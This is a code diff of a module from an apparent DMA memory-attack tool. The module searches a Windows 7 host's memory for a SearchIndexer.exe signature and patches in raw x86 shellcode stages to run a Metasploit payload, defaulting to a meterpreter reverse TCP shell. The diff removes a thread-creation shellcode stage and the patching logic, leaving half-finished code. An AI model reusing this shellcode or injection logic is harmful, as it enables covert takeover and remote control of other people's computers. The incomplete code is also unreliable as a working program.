@@ -33,18 +33,18 @@ import os
 
 info = '''A description of the module goes here.'''
 
-# class InfectSignature(collections.namedtuple('InfectSignature', 
-#                                              Signature._fields +
-#                                              ('primary', 'staged'))):
-#     '''
-#     An extension of the Signature class, with the added 'primary' field that 
-#     allows distinguishing between primary and backup signatures.
+class InfectSignature(collections.namedtuple('InfectSignature', 
+                                             Signature._fields +
+                                             ('primary', 'staged'))):
+    '''
+    An extension of the Signature class, with the added 'primary' field that 
+    allows distinguishing between primary and backup signatures.
 
-#     Mandatory additional keyword arguments:
-#     - primary: Set to True if this is the primary signature
-#     - staged: Set to True if the signature need to be staged (allocate page)
-#     '''
-#     pass
+    Mandatory additional keyword arguments:
+    - primary: Set to True if this is the primary signature
+    - staged: Set to True if the signature need to be staged (allocate page)
+    '''
+    pass
 
 stages = {
     'alloc_page': 
@@ -60,26 +60,12 @@ stages = {
         b'\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51' +
         b'\xff\xe0\x58\x5f\x5a\x8b\x12\xeb\x86\x5d\xbe\x00\x01\x00' +
         b'\x00\x6a\x40\x68\x00\x10\x00\x00\x56\x6a\x00\x68\x58\xa4' +
-        b'\x53\xe5\xff\xd5\x66\xc7\x00\xff\xe0\xff\xe0',
-    'create_thread':
-        b'\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52' +
-        b'\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26' +
-        b'\x31\xff\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d' +
-        b'\x01\xc7\xe2\xf0\x52\x57\x8b\x52\x10\x8b\x42\x3c\x01\xd0' +
-        b'\x8b\x40\x78\x85\xc0\x74\x4a\x01\xd0\x50\x8b\x48\x18\x8b' +
-        b'\x58\x20\x01\xd3\xe3\x3c\x49\x8b\x34\x8b\x01\xd6\x31\xff' +
-        b'\x31\xc0\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf4\x03\x7d' +
-        b'\xf8\x3b\x7d\x24\x75\xe2\x58\x8b\x58\x24\x01\xd3\x66\x8b' +
-        b'\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44' +
-        b'\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x58\x5f\x5a\x8b' +
-        b'\x12\xeb\x86\x5d\x31\xc0\x50\x50\x50\x8d\x9d\xa8\x00\x00' +
-        b'\x00\x53\x50\x50\x68\x38\x68\x0d\x16\xff\xd5\x61\x81\x2c' +
-        b'\x24\x05\x00\x00\x00\xc3\x58'
+        b'\x53\xe5\xff\xd5\x66\xc7\x00\xff\xe0\xff\xe0'
 }
 
-stage1 = Target(
+target = Target(
     name='Allocate page',
-    note='Create page, copy signature to it and jump to page',
+    note='Create and jump to page target',
     signatures=[
         Signature(
             offsets=[0x18c],
@@ -98,31 +84,6 @@ stage1 = Target(
             md5='',
             tag=False)
         ])
-
-stage2 = {
-'x86': Target(
-    name='Create and execute thread',
-    note='Create a new thread with the MSF payload, execute it, restore ' \
-         'stack and return to caller',
-    signatures=[
-        Signature(
-            offsets=[0],
-            chunks=[
-                Chunk(
-                    chunk=0xffe0000000000000,
-                    chunkoffset=0,
-                    patch=stages['alloc_page'],
-                    patchoffset=0)
-                ],
-            os='Windows 7',
-            os_versions=['SP0'],
-            os_architectures=['x86'],
-            executable='SearchIndexer.exe',
-            version='',
-            md5='',
-            tag=False)
-        ]),
-'x64': None}
 
 def run():
 
@@ -148,6 +109,7 @@ def run():
         device = fw.getdevice(device_index, elapsed)
         memsize = 2 * cfg.GiB
 
+    # Create memory space
     memspace = MemorySpace(device, memsize)
 
     # Connect to msf and generate shellcode(s)
@@ -156,8 +118,8 @@ def run():
     except MsfRpcError as e:
         term.fail(e)
 
-    name = term.poll('What MSF payload do you want to use?',
-        default='windows/meterpreter/reverse_tcp')
+    name = term.poll('What payload module would you like to infect the ' \
+        'host with?', default='windows/meterpreter/reverse_tcp')
     try:
         module = PayloadModule(client, name)
     except MsfRpcError as e:
@@ -176,12 +138,12 @@ def run():
         term.fail(e)
 
     needed = [x for x in module.required if x not in module.advanced]
-    # for o in module.advanced:
-    #     print('{0}: {1}'.format(o, module[o]))
-    # print('---')
-    # for o in module.required:
-    #     print('{0}: {1}'.format(o, module[o]))
-    # print('---')
+    for o in module.advanced:
+        print('{0}: {1}'.format(o, module[o]))
+    print('---')
+    for o in module.required:
+        print('{0}: {1}'.format(o, module[o]))
+    print('---')
     for o in needed:
         print('{0}: {1}'.format(o, module[o]))
     # print(payload)
@@ -189,34 +151,12 @@ def run():
 
     # TODO: Allow users to set required options
 
-    # Search for signature and patch
-    address, signature, offset, chunks = memspace.find(stage1)[0]
-    # Signature found, let's patch
-    # TODO: Externalize
-    mask = 0xfffff000 # Mask away the lower bits to find the page number
-    page = int((address & mask) / cfg.PAGESIZE)
-    term.info('Signature found at {0:#x} in page no. {1}'.format(address, page))
-    success, backup = memspace.patch(address, chunks)
+    # Search for signature
+    found = memspace.find(target)
+    print(target)
 
     # Figure out what os & architecture we're attacking and select stage
-    target = stage2[signature.os_architectures[0]]
 
-    # Concatenate stage and payload
-
-    # Replace EXITFUNC with THREAD (it's hardcoded as PROCESS)
-    # This helps ensure that the process doesn't crash if the exploit fails
-
-
-    # Write back original page
-    success = memspace.patch(address, backup)
-
-    address, signature, offset, chunks = memspace.find(stage)[0]
-    # Signature found, let's patch
-    # TODO: Externalize
-    mask = 0xfffff000 # Mask away the lower bits to find the page number
-    page = int((address & mask) / cfg.PAGESIZE)
-    term.info('Signature found at {0:#x} in page no. {1}'.format(address, page))
-    success, backup = memspace.patch(address, ##)
 
     # Copy off original memory content in the region where stage 1 will be written
 
